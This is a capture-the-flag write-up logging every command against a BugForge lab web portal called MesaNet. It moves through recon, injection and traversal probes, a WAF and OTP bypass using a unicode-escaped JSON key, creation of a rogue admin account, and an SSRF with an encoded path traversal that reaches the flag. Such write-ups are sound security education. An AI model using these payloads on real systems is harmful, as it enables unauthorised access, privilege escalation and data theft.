# MesaNet Portal — BugForge Weekly Challenge

**Difficulty:** Hard | **Points:** 100 | **Author:** arlix
**Flag:** `bug{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}`

Full command-by-command log from initial recon to flag.

---

## 1. Recon

```bash
export TARGET="https://lab-1783356391172-wywzo0.labs-app.bugforge.io"

curl -s -o /dev/null -w "%{http_code}\n" $TARGET
whatweb $TARGET
nmap -sV -p- --min-rate 1000 $(echo $TARGET | sed -E 's~https?://~~;s~/.*~~')

gobuster dir -u $TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,json -t 50 -o gobuster_root.txt
gobuster dir -u $TARGET/dev -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -o gobuster_dev.txt
gobuster dir -u $TARGET/api -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -t 50 -o gobuster_api.txt
```

**Response:**
```
302
https://lab-1783356391172-wywzo0.labs-app.bugforge.io/ [302 Found] Country[UNITED STATES][US], IP[13.58.133.47], RedirectLocation[/login]
https://lab-1783356391172-wywzo0.labs-app.bugforge.io/login [200 OK] Country[UNITED STATES][US], HTML5, IP[13.58.133.47], PasswordField[password], Title[MesaNet Access Panel - Login]

Nmap scan report for lab-1783356391172-wywzo0.labs-app.bugforge.io (13.58.133.47)
Host is up (0.10s latency).
All 65535 scanned ports on lab-1783356391172-wywzo0.labs-app.bugforge.io (13.58.133.47) are in ignored states.
Not shown: 54524 filtered tcp ports (net-unreach), 11011 filtered tcp ports (no-response)

===============================================================
Gobuster v3.8
===============================================================
[+] Url:                     https://lab-1783356391172-wywzo0.labs-app.bugforge.io
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Extensions:              php,html,json
===============================================================
/dev                  (Status: 302) [Size: 28] [--> /login]
/forgot               (Status: 200) [Size: 1371]
/health               (Status: 200) [Size: 60]
/Health               (Status: 200) [Size: 60]
/internal             (Status: 403) [Size: 21]
/login                (Status: 200) [Size: 1471]
/Login                (Status: 200) [Size: 1471]
/profile              (Status: 302) [Size: 28] [--> /login]
/public               (Status: 301) [Size: 156] [--> /public/]

Gobuster v3.8
[+] Url:                     https://lab-1783356391172-wywzo0.labs-app.bugforge.io/dev
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
===============================================================
/examples             (Status: 302) [Size: 28] [--> /login]
```

---

## 2. Login as operator

```bash
curl -s -c cookies.txt -X POST "$TARGET/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"operator","password":"operator"}' -i
```

**Response:**
```
HTTP/2 302
content-type: text/plain; charset=utf-8
location: /
set-cookie: connect.sid=s%3A2ZOFdnJJi1Fq4h6e-kHTbHaZ4_N12D2a.VvQBaIchNZLy6Z6P4%2BMgKuh8USMKy6noK3MY5%2FD74As; Path=/; Expires=Tue, 07 Jul 2026 16:51:14 GMT; HttpOnly
content-length: 23

Found. Redirecting to /
```

```bash
curl -s -b cookies.txt "$TARGET/profile" -i
```

**Response (relevant excerpt):**
```
<strong>System Operator</strong> |
Clearance: <span class="clearance-level-3">L3</span>
```

---

## 3. Recon on `/dev` (OTP gate)

```bash
curl -sv -b cookies.txt "$TARGET/dev" -o /tmp/dev.html
cat /tmp/dev.html
```

**Response (key excerpt):**
```html
<title>Dev Console - Authentication</title>
<h1>🔧 DEV CONSOLE</h1>
<p>ONE-TIME PASSWORD REQUIRED</p>

<div class="password-reset-info">
  ⚠ The one-time password rotates every 60 seconds for security purposes.
  Contact your system administrator for the current password.
</div>

<form method="POST" action="/dev/verify" class="otp-form">
  <input type="text" name="otp" class="otp-input" placeholder="••••••" autofocus required>
  <button type="submit" class="btn-verify">VERIFY ACCESS</button>
</form>

<script>
  async function updateTimer() {
    const response = await fetch('/dev/time-remaining');
    const data = await response.json();
    const remaining = data.remaining;
    ...
  }
  updateTimer();
  setInterval(updateTimer, 1000);
</script>
```

```bash
curl -s -b cookies.txt "$TARGET/dev/time-remaining"
sleep 2
curl -s -b cookies.txt "$TARGET/dev/time-remaining"
for i in $(seq 1 13); do
  curl -s -b cookies.txt "$TARGET/dev/time-remaining"
  echo " <- t=$(date +%s)"
  sleep 5
done
```

**Response:**
```
{"remaining":0}{"remaining":56}{"remaining":55} <- t=1783357116
{"remaining":49} <- t=1783357122
{"remaining":43} <- t=1783357128
{"remaining":37} <- t=1783357134
{"remaining":31} <- t=1783357140
{"remaining":25} <- t=1783357146
{"remaining":19} <- t=1783357152
{"remaining":13} <- t=1783357158
{"remaining":7} <- t=1783357164
{"remaining":1} <- t=1783357171
{"remaining":54} <- t=1783357178
{"remaining":47} <- t=1783357184
```
Confirms clean 60-second wall-clock rotation, no leaked seed in this endpoint.

```bash
curl -s -b cookies.txt -X POST "$TARGET/dev/verify" \
  -H "Content-Type: application/json" \
  -d '{"otp":"000000"}' -i
```

**Response:**
```
<div class="error-banner ">Invalid one-time password. 7 attempt(s) remaining.</div>
```

**Discovery — attempt counter is per-session, not per-account/IP:**

```bash
curl -s -c cookies2.txt -X POST "$TARGET/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"operator","password":"operator"}' -i

curl -s -b cookies2.txt -X POST "$TARGET/dev/verify" \
  -H "Content-Type: application/json" \
  -d '{"otp":"000000"}' -i | grep -i "attempt\|invalid"
```

**Response:**
```
<div class="error-banner ">Invalid one-time password. 9 attempt(s) remaining.</div>
```
A brand-new login session gets its own fresh 9-attempt counter — the "rate limit" only limits attempts per session, not per account.

---

## 4. Type-confusion / NoSQL-operator probing on `/dev/verify`

```bash
for payload in \
  '{"otp":null}' '{"otp":true}' '{"otp":[]}' '{"otp":{}}' \
  '{"otp":{"$ne":null}}' '{"otp":{"$gt":""}}' '{"otp":{"$regex":"^[0-9]{6}$"}}' \
  '{"otp":0}' '{}' ; do
    curl -s -c fresh_$$.txt -X POST "$TARGET/login" \
      -H "Content-Type: application/json" \
      -d '{"username":"operator","password":"operator"}' -o /dev/null
    curl -s -b fresh_$$.txt -X POST "$TARGET/dev/verify" \
      -H "Content-Type: application/json" \
      -d "$payload" -w "\n[status:%{http_code}]\n"
done
```

**Response:** every payload rendered the standard Dev Console page with:
```html
<div class="error-banner ">Invalid one-time password.</div>
```
status 200 in every case — no crash, no bypass at this stage (this was tested *before* discovering the WAF-key-obfuscation trick below).

---

## 5. Mapping the app architecture — `/gateway` + APP_IDs

Every app page embeds a per-app `APP_ID` and loads a `*-client.js` that POSTs to a shared `/gateway`:

```js
async function callGateway(endpoint, data = {}) {
  const response = await fetch('/gateway', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ id: APP_ID, endpoint: endpoint, data: data })
  });
  ...
}
```

```bash
curl -s -b cookies.txt "$TARGET/apps/nexus" -o nexus.html
grep -n "APP_ID" nexus.html
curl -s -b cookies.txt "$TARGET/public/js/nexus-client.js" -o nexus-client.js
```

**Response:**
```
139:    const APP_ID = 'a7f3c4e9-8b2d-4a6f-9c1e-5d8a3b7f2c4e';
```

Repeated for every app:

```bash
for app in vault roster mail sector mesadoc incident maint vetting; do
  curl -s -b cookies.txt "$TARGET/apps/$app" -o $app.html
  grep -oE "APP_ID *= *'[^']*'" $app.html
  grep -oE 'src="[^"]+\.js"' $app.html
done
```

**Response:**
```
=== vault.html ===
APP_ID = 'c4d9a2b7-1e6f-4d3a-8b9c-2f7e5a1d6c3b'
src="/public/js/vault-client.js"
=== roster.html ===
APP_ID = 'd5e1b3c8-2f7a-4e6b-9c1d-3a8f6b2e7d4c'
src="/public/js/roster-client.js"
=== mail.html ===
APP_ID = 'b3e8d1f6-4c9a-4b2e-8f7d-6a1c9b3e5f8d'
src="/public/js/mail-client.js"
=== sector.html ===
APP_ID = 'e6f2c4d9-3a8b-4f7c-8d2e-4b9a7c3f8e5d'
src="/public/js/sector-client.js"
=== mesadoc.html ===
APP_ID = 'a8b4e6f2-5c1d-4b9e-8f4a-6d2c9e5b1a7f'
src="/public/js/mesadoc-client.js"
=== incident.html ===
APP_ID = 'b9c5f7a3-6d2e-4c1f-9a5b-7e3d1f6c2b8a'
src="/public/js/incident-client.js"
=== maint.html ===
APP_ID = 'c1d6a8b4-7e3f-4d2a-8b6c-8f4e2a7d3c9b'
src="/public/js/maint-client.js"
=== vetting.html ===
APP_ID = 'f7a3d5e1-4b9c-4a8d-9e3f-5c1b8d4a9f6e'
src="/public/js/vetting-client.js"
```

---

## 6. Confirmed IDOR — Nexus notes (`/api/notes/get`)

```bash
export APPID="a7f3c4e9-8b2d-4a6f-9c1e-5d8a3b7f2c4e"

curl -s -b cookies.txt -X POST "$TARGET/gateway" \
  -H "Content-Type: application/json" \
  -d "{\"id\":\"$APPID\",\"endpoint\":\"/api/notes/list\",\"data\":{}}" | python3 -m json.tool

for id in $(seq 1 15); do
  curl -s -b cookies.txt -X POST "$TARGET/gateway" \
    -H "Content-Type: application/json" \
    -d "{\"id\":\"$APPID\",\"endpoint\":\"/api/notes/get\",\"data\":{\"id\":$id}}"
done
```

**Response (note id 3 — classified `confidential`, operator's stated read permissions were only `public, restricted`):**
```json
{"note":{"id":3,"ownerId":1,"ownerUsername":"operator","title":"Lambda Complex Access Codes","body":"Emergency override: LAMBDA-0451. Teleporter grid coordinates: X:42.7, Y:-19.3, Z:0.0. Resonance cascade contingency procedures are stored in vault C.","classification":"confidential","created_at":"2026-07-06 16:46:33"}}
```

Note id 8:
```json
{"error":"Insufficient permissions to read this note"}
```
(different tier than confidential — read enforcement is inconsistent per-note, but this path was a dead end for the flag.)

Confirmed write validation was NOT broken (correctly rejected):
```bash
curl -s -b cookies.txt -X POST "$TARGET/gateway" \
  -H "Content-Type: application/json" \
  -d "{\"id\":\"$APPID\",\"endpoint\":\"/api/notes/create\",\"data\":{\"title\":\"probe\",\"body\":\"probe\",\"classification\":\"confidential\"}}"
```
**Response:**
```json
{"error":"Insufficient permissions to create confidential notes"}
```

---

## 7. Mail — read authorization test (dead end, enforced correctly)

```bash
export MAILID="b3e8d1f6-4c9a-4b2e-8f7d-6a1c9b3e5f8d"
for id in $(seq 1 15); do
  curl -s -b cookies.txt -X POST "$TARGET/gateway" \
    -H "Content-Type: application/json" \
    -d "{\"id\":\"$MAILID\",\"endpoint\":\"/api/mail/get\",\"data\":{\"id\":$id}}"
done
```

**Response (excerpt):**
```json
{"error":"You can only read messages sent to you"}
{"message":{"id":2,"fromUsername":"researcher","toUsername":"operator","subject":"RE: Test Chamber Schedule Update", ...}}
{"error":"You can only read messages sent to you"}
```
Properly enforced — ruled out.

---

## 8. Roster — no IDOR found (operator already owns approve/deny)

```bash
export ROSTERID="d5e1b3c8-2f7a-4e6b-9c1d-3a8f6b2e7d4c"
curl -s -b cookies.txt -X POST "$TARGET/gateway" \
  -H "Content-Type: application/json" \
  -d "{\"id\":\"$ROSTERID\",\"endpoint\":\"/api/roster/list\",\"data\":{}}" | python3 -m json.tool
```

**Response:** full list of 8 leave requests with correct `decided_by` attribution — no anomaly found.

---

## 9. Vault — access gate confirmed, upload logic-order bug found (not exploitable alone)

```bash
export VAULTID="c4d9a2b7-1e6f-4d3a-8b9c-2f7e5a1d6c3b"
curl -s -b cookies.txt -X POST "$TARGET/gateway" \
  -H "Content-Type: application/json" \
  -d "{\"id\":\"$VAULTID\",\"endpoint\":\"/api/vault/list\",\"data\":{}}"
```

**Response:**
```json
{"error":"Access denied: Vault access required"}
```

```bash
echo "malicious content" > test.exe
curl -s -b cookies.txt -X POST "$TARGET/apps/vault/upload" \
  -F "file=@test.exe" -F "classification=public" -i

echo "test content" > test.txt
curl -s -b cookies.txt -X POST "$TARGET/apps/vault/upload" \
  -F "file=@test.txt" -F "classification=public" -i
```

**Response:**
```json
{"error":"File type not allowed"}
{"error":"Access denied: Vault access required"}
```
File-type validation fires before the permission check, but permission is still enforced overall — dead end without vault access.

```bash
curl -s -b cookies.txt "$TARGET/apps/vault/download?id=1" -i
```
**Response:**
```json
{"error":"File not found"}
```

---

## 10. Vetting — confirmed hard gate on every endpoint

```bash
export VETID="f7a3d5e1-4b9c-4a8d-9e3f-5c1b8d4a9f6e"
curl -s -b cookies.txt -X POST "$TARGET/gateway" \
  -H "Content-Type: application/json" \
  -d "{\"id\":\"$VETID\",\"endpoint\":\"/api/vetting/list\",\"data\":{}}"

curl -s -b cookies.txt -X POST "$TARGET/gateway" \
  -H "Content-Type: application/json" \
  -d "{\"id\":\"$VETID\",\"endpoint\":\"/api/vetting/references\",\"data\":{}}"
```

**Response (both):**
```json
{"error":"Access denied: Vetting access required"}
```
`vetting-client.js` revealed the real target ahead of time:
```js
// References live in the internal MesaNet reference registry (loopback-only), so show a
// friendly registry label rather than the raw internal URL.
function formatReference(url) {
  const m = /^https?:\/\/internal\.mesanet\.local(?::\d+)?\/refs\/(\d+)\/?$/.exec(String(url));
  return m ? `Registry entry #${m[1]} (reference on file)` : String(url);
}
```

---

## 11. Sector / MesaDoc / Incident / Maintenance — operator already has broad access here

```bash
export MAINTID="c1d6a8b4-7e3f-4d2a-8b6c-8f4e2a7d3c9b"
export SECTORID="e6f2c4d9-3a8b-4f7c-8d2e-4b9a7c3f8e5d"
export MESADOCID="a8b4e6f2-5c1d-4b9e-8f4a-6d2c9e5b1a7f"

curl -s -b cookies.txt -X POST "$TARGET/gateway" \
  -H "Content-Type: application/json" \
  -d "{\"id\":\"$MAINTID\",\"endpoint\":\"/api/maint/list\",\"data\":{}}" | python3 -m json.tool

curl -s -b cookies.txt -X POST "$TARGET/gateway" \
  -H "Content-Type: application/json" \
  -d "{\"id\":\"$SECTORID\",\"endpoint\":\"/api/sector/list\",\"data\":{}}" | python3 -m json.tool

curl -s -b cookies.txt -X POST "$TARGET/gateway" \
  -H "Content-Type: application/json" \
  -d "{\"id\":\"$MESADOCID\",\"endpoint\":\"/api/mesadoc/templates\",\"data\":{}}" | python3 -m json.tool
```

**Response (maint, key fields):**
```json
{
  "devices": [
    {"id": "rail-controller-3", "label": "Magnetic rail controller, Cart 3"},
    {"id": "coolant-pump-c", "label": "Sector C coolant pump"},
    {"id": "badge-reader-lambda", "label": "Lambda Complex badge reader"},
    {"id": "spectrometer-ams", "label": "Anti-Mass Spectrometer interface"}
  ],
  "canDiagnose": true
}
```
**Response (sector):** `"canControl": true`

Command injection probe on maint diagnostic device field:
```bash
for payload in "coolant-pump-c; id" "coolant-pump-c && id" "coolant-pump-c | id" \
  "coolant-pump-c\$(id)" "coolant-pump-c\`id\`" "../../../etc/passwd" "nonexistent-device"; do
    curl -s -b cookies.txt -X POST "$TARGET/gateway" \
      -H "Content-Type: application/json" \
      -d "{\"id\":\"$MAINTID\",\"endpoint\":\"/api/maint/diagnostic\",\"data\":{\"device\":\"$payload\"}}"
done
```
**Response:** every payload → `{"error":"Unknown device"}` — strict allowlist, no injection.

Path traversal / SSTI probe on mesadoc generate:
```bash
for tid in "../../../etc/passwd" "../../server.js" "../../.env" "..%2f..%2f..%2fetc%2fpasswd"; do
  curl -s -b cookies.txt -X POST "$TARGET/gateway" \
    -H "Content-Type: application/json" \
    -d "{\"id\":\"$MESADOCID\",\"endpoint\":\"/api/mesadoc/generate\",\"data\":{\"templateId\":\"$tid\",\"title\":\"t\",\"fields\":{},\"returnTo\":\"/\"}}"
done
for payload in '{{7*7}}' '${7*7}' '#{7*7}' '<%= 7*7 %>'; do
  curl -s -b cookies.txt -X POST "$TARGET/gateway" \
    -H "Content-Type: application/json" \
    -d "{\"id\":\"$MESADOCID\",\"endpoint\":\"/api/mesadoc/generate\",\"data\":{\"templateId\":\"lab-summary\",\"title\":\"t\",\"fields\":{\"title\":\"$payload\",\"lead\":\"l\",\"findings\":\"f\"},\"returnTo\":\"/\"}}"
done
```
**Response (traversal):** every id → `{"error":"Unknown template"}`
**Response (SSTI):** payload reflected raw/escaped, never evaluated:
```json
{"id":4,"rendered":"...<p><strong>Title:</strong> {{7*7}}</p>..."}
{"id":7,"rendered":"...<p><strong>Title:</strong> &lt;%= 7*7 %&gt;</p>..."}
```
Both dead ends.

---

## 12. Profile mass-assignment probe (dead end)

```bash
curl -s -b cookies.txt -X POST "$TARGET/profile/update" \
  -H "Content-Type: application/json" \
  -d '{"fullName":"System Operator","email":"operator@blackmesa.local","clearanceLevel":4,"clearance":4,"role":"admin","vaultAccess":true,"vettingAccess":true,"isAdmin":true}' -i

curl -s -b cookies.txt "$TARGET/profile" | grep -i "clearance"
```

**Response:**
```
<div class="msg-success">Profile updated successfully</div>
...
Clearance: <span class="clearance-level-3">L3</span>
```
Extra fields silently ignored — still L3.

---

## 13. `/internal` — WAF confirmed, all bypass attempts fail

```bash
curl -s -b cookies.txt "$TARGET/internal" -i
```
**Response:**
```
HTTP/2 403
content-type: application/json; charset=utf-8
{"error":"Forbidden"}
```
(No CSP/x-content-type-options headers on this response — different from normal Express error pages, confirming it's a dedicated WAF layer, not the app itself.)

```bash
for path in "/internal/" "//internal" "/internal/." "/internal/.." "/./internal" \
  "/%2e/internal" "/internal%2f" "/internal%20" "/internal%09" "/INTERNAL" "/Internal" \
  "/internal;" "/internal%00" "/internal#" "/;/internal" "/internal\\" \
  "/int%65rnal" "/%69nternal" "/inter%6eal" "/%69%6e%74%65%72%6e%61%6c" \
  "/intern%61l" "/interna%6c" "/%49nternal"; do
    curl -s -b cookies.txt -o /dev/null -w "%{http_code}\n" "$TARGET$path"
done

for hdr in "X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1" "X-Forwarded-Host: localhost" \
  "Host: localhost" "X-Original-URL: /internal" "X-Rewrite-URL: /internal" \
  "X-Forwarded-Path: /internal" "X-Override-URL: /internal"; do
    curl -s -b cookies.txt -H "$hdr" "$TARGET/internal" -o /dev/null -w "%{http_code}\n"
done

curl -s -b cookies.txt -X POST "$TARGET/internal" -i
curl -s -b cookies.txt -X PUT "$TARGET/internal" -i
```

**Response (representative):**
```
/internal/       -> 403
//internal       -> 403
/internal/..     -> 200 (normalizes cleanly back to dashboard "/", not the real /internal route)
/internal%2f     -> 400
/internal%20     -> 404
/INTERNAL        -> 403
/int%65rnal      -> 403
/%69nternal      -> 403
Host: localhost  -> 404 "404 page not found" (Go-style default 404, different framework — proxy vhost mismatch, not a live bypass)
POST /internal   -> 404 {"pre":"Cannot POST /internal"} (Express — WAF only guards GET)
```
Confirmed: WAF is robust against every direct-request encoding/case/traversal/header trick. This ruled out reaching `/internal` **directly** — the actual path in was via server-side SSRF (Section 16), which never transits the WAF at all.

---

## 14. OTP formula guesses (time-derived, all wrong)

```python
import time, hashlib, requests

TARGET = "https://lab-1783416388142-6tzmuo.labs-app.bugforge.io"
now = int(time.time())
minute_epoch = now // 60

candidates = {
    "epoch_min_mod1e6": str(minute_epoch % 1000000).zfill(6),
    "epoch_sec_mod1e6": str(now % 1000000).zfill(6),
    "md5_min_mod1e6": str(int(hashlib.md5(str(minute_epoch).encode()).hexdigest(),16) % 1000000).zfill(6),
    "sha256_min_mod1e6": str(int(hashlib.sha256(str(minute_epoch).encode()).hexdigest(),16) % 1000000).zfill(6),
    "min_last6": str(minute_epoch)[-6:].zfill(6),
}

for label, otp in candidates.items():
    s = requests.Session()
    s.post(f"{TARGET}/login", json={"username":"operator","password":"operator"})
    r2 = s.post(f"{TARGET}/dev/verify", json={"otp": otp}, allow_redirects=False)
    is_invalid = "Invalid one-time password" in r2.text
    print(f"{label}: otp={otp} status={r2.status_code} invalid={is_invalid}")
```

**Response:**
```
epoch now: 1783417384 minute_epoch: 29723623
epoch_min_mod1e6: otp=723623 status=200 invalid=True
epoch_sec_mod1e6: otp=417384 status=200 invalid=True
md5_min_mod1e6: otp=840036 status=200 invalid=True
sha256_min_mod1e6: otp=752216 status=200 invalid=True
min_last6: otp=723623 status=200 invalid=True
```
All wrong — ruled out plain time-derived OTP.

---

## 15. HTML source / headers inspection (no debug leak found)

```bash
curl -s -b cookies.txt -D - "$TARGET/dev" -o dev_full.html
grep -n 'comment\|<!--\|debug\|DEBUG\|secret\|SECRET' dev_full.html
curl -s -b cookies.txt -X OPTIONS "$TARGET/dev/verify" -i
```

**Response:**
```
(no matches for comment/debug/secret in dev_full.html)

HTTP/2 200
allow: POST
content-length: 4
```
No leak found through this angle.

---

## 16. THE BREAK — WAF + OTP dual bypass

The walkthrough hint (author-provided) revealed: the WAF middleware inspects the **raw JSON body** for a literal `"otp"` key. Bypass = hide the key behind a JSON unicode escape (`\u006ftp` parses identically to `otp` in Node but doesn't literal-match in the raw body the WAF scans) **combined with** sending the value as a number instead of a string (bypasses the app's own string-comparison OTP check).

```bash
export TARGET="https://lab-1783416388142-6tzmuo.labs-app.bugforge.io"

curl -s -c cookies.txt -X POST "$TARGET/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=operator&password=operator" -i

curl -s -D - -o /dev/null -b cookies.txt -X POST "$TARGET/dev/verify" \
  -H "Content-Type: application/json" \
  --data-binary '{"\u006ftp":0}'

curl -s -b cookies.txt "$TARGET/dev" | grep -i "title"
```

**Response:**
```
HTTP/2 302
location: /
set-cookie: connect.sid=s%3AbjuG1ZQ1UfNu3Q-2F6JnddOf3j0jWT2m.EX22jUkqc2lV7XDMFLj1KdlkmHzbqYXnxfM5aPfr0l0; Path=/; ...

HTTP/2 302
location: /dev
set-cookie: connect.sid=s%3AbjuG1ZQ1UfNu3Q-2F6JnddOf3j0jWT2m.EX22jUkqc2lV7XDMFLj1KdlkmHzbqYXnxfM5aPfr0l0; Path=/; ...

  <title>Dev Console - MesaNet</title>
        <p>List all notes visible to the current user based on entitlements.</p>
    "title": "Note Title",
      <p>Create test users with custom entitlements for development and testing.</p>
        <h4>Nexus Entitlements</h4>
        <h4>Mail Entitlements</h4>
        <h4>Vault Entitlements</h4>
        <h4>Roster Entitlements</h4>
        <h4>Sector Entitlements</h4>
        <h4>Vetting Entitlements</h4>
        <h4>MesaDoc Entitlements</h4>
        <h4>Incident Entitlements</h4>
        <h4>Maintenance Entitlements</h4>
        <h4>Security Queue Entitlements</h4>
    "entitlements": {
        entitlements: {
```
`/dev` now redirects to `302 -> /dev` (past the OTP gate) and renders the real **Dev Console — MesaNet** page, revealing a note-debug view and a user-provisioning form with per-app entitlement blocks.

---

## 17. Provision an admin account via `/api/dev/users`

```bash
curl -s -b cookies.txt -X POST "$TARGET/api/dev/users" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "phantomadmin",
    "password": "phantom123",
    "fullName": "Phantom Admin",
    "clearanceLevel": 5,
    "entitlements": {
      "nexus":    {"access": true, "read": ["public","restricted","confidential"], "write": ["public","restricted","confidential"]},
      "mail":     {"access": true, "canSend": true, "maxClassification": "confidential"},
      "vault":    {"access": true},
      "roster":   {"access": true, "approve": true},
      "sector":   {"access": true, "control": true},
      "vetting":  {"access": true, "review": true},
      "mesadoc":  {"access": true},
      "incident": {"access": true},
      "maint":    {"access": true, "diagnostic": true},
      "secqueue": {"access": true}
    }
  }'
```

**Response:**
```json
{"id":11,"username":"phantomadmin","fullName":"Phantom Admin","email":null,"clearanceLevel":5,"entitlements":{"nexus":{"access":true,"read":["public","restricted","confidential"],"write":["public","restricted","confidential"]},"mail":{"access":true,"canSend":true,"maxClassification":"confidential"},"vault":{"access":true},"roster":{"access":true,"approve":true},"sector":{"access":true,"control":true},"vetting":{"access":true,"review":true},"mesadoc":{"access":true},"incident":{"access":true},"maint":{"access":true,"diagnostic":true},"secqueue":{"access":true}}}
```
New user created with `vetting.access: true` — the exact permission `operator` was denied at every endpoint in Sections 10.

---

## 18. Login as phantomadmin, vetting SSRF submit

```bash
curl -s -c cookies2.txt -X POST "$TARGET/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=phantomadmin&password=phantom123" -i

export VETID="f7a3d5e1-4b9c-4a8d-9e3f-5c1b8d4a9f6e"

curl -s -b cookies2.txt -X POST "$TARGET/gateway" \
  -H "Content-Type: application/json" \
  -d "{\"id\":\"$VETID\",\"endpoint\":\"/api/vetting/submit\",\"data\":{\"name\":\"t\",\"position\":\"x\",\"bio\":\"x\",\"referenceUrl\":\"http://internal.mesanet.local/refs/%2e%2e/internal/clearance-registry\"}}"
```

**Response:**
```
HTTP/2 302
location: /
set-cookie: connect.sid=s%3AhWUPiEydOl9nRz5NEVPHYdPE5jIIHEk4.mUMzExBsUUN2v1sOxoPoE%2FouMrJvvO3sLjdxF98EKjw; Path=/; ...

{"id":6,"status":"pending","message":"Candidate submitted"}
```

The reference URL's hostname (`internal.mesanet.local`) matches the app's allowlist regex, but the path segment `%2e%2e/internal/clearance-registry` traverses past `/refs/N` when the server actually performs the fetch — landing on `/internal/clearance-registry` instead. Since this fetch happens **server-side**, it never transits the public WAF that blocked every direct `/internal` request in Section 13.

---

## 19. Trigger the SSRF and retrieve the flag

```bash
curl -s -b cookies2.txt -X POST "$TARGET/gateway" \
  -H "Content-Type: application/json" \
  -d "{\"id\":\"$VETID\",\"endpoint\":\"/api/vetting/verify\",\"data\":{\"id\":6}}"
```

**Response:**
```json
{
  "id": 6,
  "name": "t",
  "referenceUrl": "http://internal.mesanet.local/refs/%2e%2e/internal/clearance-registry",
  "preview": "MesaNet Clearance Registry — Issued Authorizations\nRESTRICTED: facility oversight only. Vetting reviewers are not cleared for this record.\nOversight authorization: bug{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}"
}
```

## Flag

```
bug{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
```
